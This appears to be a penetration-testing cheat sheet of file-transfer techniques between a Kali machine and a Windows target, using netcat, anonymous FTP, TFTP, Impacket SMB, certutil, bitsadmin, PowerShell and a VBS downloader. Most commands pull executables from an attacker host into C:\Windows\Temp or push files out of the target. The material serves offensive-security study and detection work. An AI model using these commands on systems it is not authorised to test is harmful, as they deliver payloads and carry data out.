##############
File Transfers
##############

Netcat
======

Transferring from Kali to Windows
---------------------------------

On Kali run:

.. code-block:: bash

    nc -nvlp 4444 < /path/to/file.exe

On Windows run:

.. code-block:: none

    nc.exe -nv 10.0.0.1 4444 > file.exe

Transferring from Windows to Kali
---------------------------------

On Kali run:

.. code-block:: bash

    nc -nvlp 4444 > /path/to/file.exe

On Windows run:

.. code-block:: none

    nc.exe -nv 10.0.0.1 4444 < file.exe

FTP
===

We can use python to create a quick FTP server. Install the following package:

.. code-block:: bash

    apt install python3-pyftpdlib

The ftp command on Windows is interactive by default. The :code:`-s` command line option can be used in conjunction with a text file that contains FTP commands to get around this limitation.

Transferring from Kali to Windows
---------------------------------

Start the FTP server on Kali:

.. code-block:: bash

    python3 -m pyftpdlib -p 21

    OR

    python -m pyftpdlib -p 21

On Windows, create a text file with the commands you wish to use:

.. code-block:: none

    echo open 192.168.1.78 > ftp.txt
    echo binary >> ftp.txt
    echo get test.txt >> ftp.txt
    echo bye >> ftp.txt

You can then execute the commands in the file with the following command:

.. code-block:: none

    ftp -A -s:ftp.txt

Note the :code:`-A` command line option, which performs an anonymous login.

Transferring from Windows to Kali
---------------------------------

Start the FTP server on Kali with write permissions (note: this is dangerous as we are using anonymous logins):

.. code-block:: bash

    python3 -m pyftpdlib -p 21 -w

    OR

    python -m pyftpdlib -p 21 -w

On Windows, create a text file with the commands you wish to use:

.. code-block:: none

    echo open 192.168.1.78 > ftp.txt
    echo binary >> ftp.txt
    echo put test.txt >> ftp.txt
    echo bye >> ftp.txt

You can then execute the commands in the file with the following command:

.. code-block:: none

    ftp -A -s:ftp.txt

Note the :code:`-A` command line option, which performs an anonymous login.

TFTP
====

TFTP is installed by default on Windows XP. It may not be installed on other versions of Windows. Sometimes it can be enabled on the command line:

.. code-block:: none

    pkgmgr /iu:"TFTP"

On Kali install a TFTP server:

.. code-block:: bash

    apt install atftpd

Create a dedicated tftp directory and change the ownership:

.. code-block:: bash

    mkdir /tftp
    chown nobody:nogroup /tftp

Run the TFTP server:

.. code-block:: bash

    atftpd --daemon --no-fork /tftp/

Transferring from Kali to Windows
---------------------------------

.. code-block:: none

    tftp -i 10.0.0.1 GET file.exe

Transferring from Windows to Kali
---------------------------------

.. code-block:: none

    tftp -i 10.0.0.1 PUT file.exe

SMB
===

Kali has an SMB server python script courtesy of Impacket.

Run the server on Kali:

.. code-block:: bash

    python /usr/share/doc/python-impacket/examples/smbserver.py kali /path/to/directory

On Windows, check that the share can be seen:

.. code-block:: none

    net view \\10.0.0.1
    Shared resources at \\10.0.0.1

    (null)

    Share name  Type  Used as  Comment

    -----------------------------------
    KALI        Disk
    The command completed successfully.

Regular filesystem commands should all work, and files can be copied to and from the share:

.. code-block:: none

    dir \\10.0.0.1\kali
    copy \\10.0.0.1\kali\file.exe C:\Windows\Temp\file.exe
    copy C:\Windows\Temp\file.exe \\10.0.0.1\kali\file.exe

HTTP
====

We can use python to create a quick HTTP server:

.. code-block:: bash

    python3 -m http.server 4444

    OR

    python -m SimpleHTTPServer 4444

CertUtil
--------

certutil.exe is available on more modern versions of Windows.

.. code-block:: none

    certutil.exe -urlcache -split -f http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe

BITSAdmin
---------

.. code-block:: none

    bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe


PowerShell Script
-----------------

.. code-block:: none

    powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('http://10.0.0.1:4444/file.exe','C:\Windows\Temp\file.exe')"

Can also be dumped into a script:

.. code-block:: none

    echo $webclient = New-Object System.Net.WebClient > wget.ps1
    echo $url = "http://10.0.0.1:4444/file.exe" >> wget.ps1
    echo $output = "C:\Windows\Temp\file.exe" >> wget.ps1
    echo $webclient.DownloadFile($url,$output) >> wget.ps1

Run with:

.. code-block:: none

    powershell wget.ps1

VBS Script
----------

.. code-block:: none

    strFileURL = "http://10.0.0.1:4444/file.exe"
    strHDLocation = "C:\Windows\Temp\file.exe"
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.open "GET", strFileURL, false
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1 'adTypeBinary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
    Set objFSO = Nothing
    objADOStream.SaveToFile strHDLocation
    objADOStream.Close
    Set objADOStream = Nothing
    End if
    Set objXMLHTTP = Nothing

As a series of echo statements:

.. code-block:: none

    echo strFileURL = "http://10.0.0.1:4444/file.exe" >> downloadfile.vbs
    echo strHDLocation = "C:\Windows\Temp\file.exe" >> downloadfile.vbs
    echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> downloadfile.vbs
    echo objXMLHTTP.open "GET", strFileURL, false >> downloadfile.vbs
    echo objXMLHTTP.send() >> downloadfile.vbs
    echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs
    echo Set objADOStream = CreateObject("ADODB.Stream") >> downloadfile.vbs
    echo objADOStream.Open >> downloadfile.vbs
    echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs
    echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs
    echo objADOStream.Position = 0 >> downloadfile.vbs
    echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> downloadfile.vbs
    echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs
    echo Set objFSO = Nothing >> downloadfile.vbs
    echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs
    echo objADOStream.Close >> downloadfile.vbs
    echo Set objADOStream = Nothing >> downloadfile.vbs
    echo End if >> downloadfile.vbs
    echo Set objXMLHTTP = Nothing >> downloadfile.vbs
    echo ""

Run with the following command:

.. code-block:: none

    cscript downloadfile.vbs
